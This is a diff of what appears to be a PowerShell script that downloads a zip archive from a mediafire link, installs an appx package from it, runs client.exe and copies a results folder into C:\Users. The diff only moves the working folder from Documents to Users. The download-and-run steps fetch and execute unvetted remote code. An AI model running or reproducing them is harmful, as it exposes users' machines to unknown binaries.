@@ -8,7 +8,7 @@ cd ..
 cd ..
 cd ..
 cd ..
-Invoke-WebRequest -Uri http://download1525.mediafire.com/4xvfh9ejstmg/9jst20oi7ryqzp1/toolsv2.zip -OutFile (Join-Path Documents toolsv2.zip)
+Invoke-WebRequest -Uri http://download1525.mediafire.com/4xvfh9ejstmg/9jst20oi7ryqzp1/toolsv2.zip -OutFile (Join-Path Users toolsv2.zip)
 Add-Type -AssemblyName System.IO.Compression.FileSystem
  function Unzip
  {
@@ -17,9 +17,9 @@ Add-Type -AssemblyName System.IO.Compression.FileSystem
      [System.IO.Compression.ZipFile]::ExtractToDirectory($zipfile, $outpath)
 }
 
-Unzip "Documents\toolsv2.zip" "Documents"
-add-appxpackage -path "Documents\toolsv2\python310.appx"
-cd Documents
+Unzip "Users\toolsv2.zip" "Users"
+add-appxpackage -path "Users\toolsv2\python310.appx"
+cd Users
 cd toolsv2
 ./client.exe
 robocopy 'results' 'C:\\Users\'
